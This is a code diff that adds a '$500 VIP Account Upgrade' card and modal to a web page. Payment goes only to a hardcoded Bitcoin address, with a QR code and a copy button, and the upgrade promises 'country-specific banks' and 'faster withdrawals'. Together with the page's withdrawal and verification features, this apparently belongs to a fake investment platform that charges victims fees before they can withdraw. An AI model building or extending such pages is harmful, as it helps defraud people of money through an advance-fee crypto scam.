@@ -185,6 +185,23 @@
             </a>
         </div>
 
+        <!-- VIP Upgrade -->
+        <div class="bg-gradient-to-r from-[#1a1a1a] to-[#111111] border border-[#E82127]/30 rounded-2xl p-5">
+            <div class="flex justify-between items-start">
+                <div>
+                    <span class="inline-block bg-[#E82127] text-[10px] px-3 py-1 rounded-full font-bold tracking-widest">PREMIUM</span>
+                    <h4 class="text-lg font-bold mt-3">VIP Account Upgrade</h4>
+                    <p class="text-sm text-neutral-400">Unlock country-specific banks + faster withdrawals</p>
+                </div>
+                <div class="text-right">
+                    <span class="text-2xl font-bold text-white">$500</span>
+                    <p class="text-xs text-emerald-400">One-time</p>
+                </div>
+            </div>
+            
+            <button onclick="showVipUpgradeModal()" class="mt-6 w-full bg-[#E82127] py-4 rounded-2xl font-medium text-sm">Upgrade Now</button>
+        </div>
+
         <!-- Account Verification -->
         <div class="bg-[#141414] border border-[#222] rounded-2xl p-4">
             <div class="flex items-center justify-between">
@@ -359,6 +376,28 @@
                 <button type="submit" class="w-full bg-[#E82127] py-4 rounded-2xl">Submit for Verification</button>
             </form>
             <button onclick="closeVerificationModal()" class="mt-4 w-full text-neutral-400">Cancel</button>
+        </div>
+    </div>
+
+    <!-- VIP Upgrade Modal -->
+    <div id="vipModal" class="hidden fixed inset-0 bg-black/90 z-[300] flex items-center justify-center p-6">
+        <div class="bg-[#141414] border border-[#E82127] rounded-3xl p-8 w-full max-w-md text-center">
+            <h3 class="text-2xl font-bold text-[#E82127] mb-2">VIP Upgrade</h3>
+            <p class="text-neutral-400 mb-6">$500 • Unlock Country Banks + Priority Withdrawals</p>
+            
+            <div class="bg-black rounded-2xl p-6 mb-6">
+                <div class="text-center mb-4">
+                    <span class="text-5xl">₿</span>
+                </div>
+                <p class="text-xs text-neutral-500 mb-2">Pay with Bitcoin</p>
+                <div class="bg-white p-2 rounded-xl mx-auto w-fit">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e" class="w-48 h-48">
+                </div>
+                <p id="btcAddress" class="font-mono text-[10px] text-neutral-400 mt-4 break-all">bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e</p>
+            </div>
+
+            <button onclick="copyBtcAddress()" class="w-full bg-neutral-800 py-4 rounded-2xl mb-3">Copy BTC Address</button>
+            <button onclick="closeVipModal()" class="w-full text-neutral-400">Cancel</button>
         </div>
     </div>
 
@@ -558,6 +597,22 @@
             closeVerificationModal();
             document.getElementById('verificationStatus').innerText = "Verification Pending";
         });
+
+        // VIP Upgrade Modal
+        function showVipUpgradeModal() {
+            document.getElementById('vipModal').classList.remove('hidden');
+        }
+
+        function closeVipModal() {
+            document.getElementById('vipModal').classList.add('hidden');
+        }
+
+        function copyBtcAddress() {
+            const address = "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e";
+            navigator.clipboard.writeText(address).then(() => {
+                alert("BTC Address copied!");
+            });
+        }
 
         if (!userId) {
             window.location.href = "index.html";
